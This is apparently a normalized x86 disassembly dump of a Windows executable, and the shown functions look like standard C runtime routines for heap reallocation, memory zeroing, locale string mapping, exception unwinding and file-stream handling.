jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x42c ]
push 0x20
lea esi [ ebp - 0x41c ]
dec edi
call sub_409445
cmp [ ebp - 0x41c ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov ecx [ ebp - 0x410 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_40a0a1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40654c
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_40a10c
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_405060
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_404a59
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_405103
pop ecx
call sub_405be1
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_405be1
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405b9f
pop ecx
mov [ esi ] eax
push esi
call sub_405103
pop ecx
test eax eax
je r-xdata
call sub_405be1
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405b9f
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_40a2fc
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_40a3b6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_404a59
push [ esi + 0x8 ]
call sub_404a59
push [ esi + 0xc ]
call sub_404a59
push [ esi + 0x10 ]
call sub_404a59
push [ esi + 0x14 ]
call sub_404a59
push [ esi + 0x18 ]
call sub_404a59
push [ esi ]
call sub_404a59
push [ esi + 0x20 ]
call sub_404a59
push [ esi + 0x24 ]
call sub_404a59
push [ esi + 0x28 ]
call sub_404a59
push [ esi + 0x2c ]
call sub_404a59
push [ esi + 0x30 ]
call sub_404a59
push [ esi + 0x34 ]
call sub_404a59
push [ esi + 0x1c ]
call sub_404a59
push [ esi + 0x38 ]
call sub_404a59
push [ esi + 0x3c ]
call sub_404a59
add esp 0x40
push [ esi + 0x40 ]
call sub_404a59
push [ esi + 0x44 ]
call sub_404a59
push [ esi + 0x48 ]
call sub_404a59
push [ esi + 0x4c ]
call sub_404a59
push [ esi + 0x50 ]
call sub_404a59
push [ esi + 0x54 ]
call sub_404a59
push [ esi + 0x58 ]
call sub_404a59
push [ esi + 0x5c ]
call sub_404a59
push [ esi + 0x60 ]
call sub_404a59
push [ esi + 0x64 ]
call sub_404a59
push [ esi + 0x68 ]
call sub_404a59
push [ esi + 0x6c ]
call sub_404a59
push [ esi + 0x70 ]
call sub_404a59
push [ esi + 0x74 ]
call sub_404a59
push [ esi + 0x78 ]
call sub_404a59
push [ esi + 0x7c ]
call sub_404a59
add esp 0x40
push [ esi + 0x80 ]
call sub_404a59
push [ esi + 0x84 ]
call sub_404a59
push [ esi + 0x88 ]
call sub_404a59
push [ esi + 0x8c ]
call sub_404a59
push [ esi + 0x90 ]
call sub_404a59
push [ esi + 0x94 ]
call sub_404a59
push [ esi + 0x98 ]
call sub_404a59
push [ esi + 0x9c ]
call sub_404a59
push [ esi + 0xa0 ]
call sub_404a59
push [ esi + 0xa4 ]
call sub_404a59
push [ esi + 0xa8 ]
call sub_404a59
push [ esi + 0xbc ]
call sub_404a59
push [ esi + 0xc0 ]
call sub_404a59
push [ esi + 0xc4 ]
call sub_404a59
push [ esi + 0xc8 ]
call sub_404a59
push [ esi + 0xcc ]
call sub_404a59
add esp 0x40
push [ esi + 0xd0 ]
call sub_404a59
push [ esi + 0xb8 ]
call sub_404a59
push [ esi + 0xd8 ]
call sub_404a59
push [ esi + 0xdc ]
call sub_404a59
push [ esi + 0xe0 ]
call sub_404a59
push [ esi + 0xe4 ]
call sub_404a59
push [ esi + 0xe8 ]
call sub_404a59
push [ esi + 0xec ]
call sub_404a59
push [ esi + 0xd4 ]
call sub_404a59
push [ esi + 0xf0 ]
call sub_404a59
push [ esi + 0xf4 ]
call sub_404a59
push [ esi + 0xf8 ]
call sub_404a59
push [ esi + 0xfc ]
call sub_404a59
push [ esi + 0x100 ]
call sub_404a59
push [ esi + 0x104 ]
call sub_404a59
push [ esi + 0x108 ]
call sub_404a59
add esp 0x40
push [ esi + 0x10c ]
call sub_404a59
push [ esi + 0x110 ]
call sub_404a59
push [ esi + 0x114 ]
call sub_404a59
push [ esi + 0x118 ]
call sub_404a59
push [ esi + 0x11c ]
call sub_404a59
push [ esi + 0x120 ]
call sub_404a59
push [ esi + 0x124 ]
call sub_404a59
push [ esi + 0x128 ]
call sub_404a59
push [ esi + 0x12c ]
call sub_404a59
push [ esi + 0x130 ]
call sub_404a59
push [ esi + 0x134 ]
call sub_404a59
push [ esi + 0x138 ]
call sub_404a59
push [ esi + 0x13c ]
call sub_404a59
push [ esi + 0x140 ]
call sub_404a59
push [ esi + 0x144 ]
call sub_404a59
push [ esi + 0x148 ]
call sub_404a59
add esp 0x40
push [ esi + 0x14c ]
call sub_404a59
push [ esi + 0x150 ]
call sub_404a59
push [ esi + 0x154 ]
call sub_404a59
push [ esi + 0x158 ]
call sub_404a59
push [ esi + 0x15c ]
call sub_404a59
push [ esi + 0x160 ]
call sub_404a59
add esp 0x18
sub_40a72d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
push esi
call sub_404a59
pop ecx
sub_40a796
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_404a59
pop ecx
push esi
call sub_404a59
pop ecx
sub_40a894
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_404645
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_407551
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_405060
pop ecx
cmp eax ebx
je r-xdata
call sub_40a2d0
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_407551
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_405060
pop ecx
cmp eax ebx
je r-xdata
call sub_40a2d0
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_40aa7b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40654c
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40a894
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40aac1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_404645
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_407580
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_407551
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_405060
pop ecx
cmp eax ebx
je r-xdata
call sub_40a2d0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_40aba8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40654c
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40aac1
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40abf0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ac10
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_404645
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_40ac55
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40ac55
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_40ac10
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40ad05
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40ad24
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_40ad05
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_40ad27
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_405be1
mov [ eax ] 0x9
call sub_405bf4
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40adad
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_405bf4
and [ eax ] 0x0
call sub_405be1
mov [ eax ] 0x9
call sub_405bf4
and [ eax ] 0x0
call sub_405be1
mov [ eax ] 0x9
call sub_40571b
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_40ae16
push 0xc
push r--data
call sub_405df0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_4052f1
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_405e35
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40aeac
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_40aeb5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_40aedc
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_40b460
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_40af20
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_40af4b
push 0x10
push r--data
call sub_405df0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_4052f1
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40afde
mov eax [ ebp - 0x1c ]
call sub_405e35
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_40b503
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_404a59
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_40afe7
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_409071
pop ecx
push eax
call sub_408d49
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_40b04f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_40afe7
pop ecx
test eax eax
je r-xdata
push esi
call sub_40b097
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_409071
push eax
call sub_40b577
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_40b097
push 0x14
push r--data
call sub_405df0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_4052f1
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b168
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_405e35
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_408fd4
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_40b139
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_40b04f
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_40b04f
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_40b17a
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_409071
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_405be1
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_405be1
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_408ebc
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_408d49
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_408e66
pop ecx
test eax eax
jne r-xdata
call sub_408ebc
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_408d49
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_408e1d
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_408562
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_40b2ee
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_40654c
mov eax [ ebp - 0x10 ]
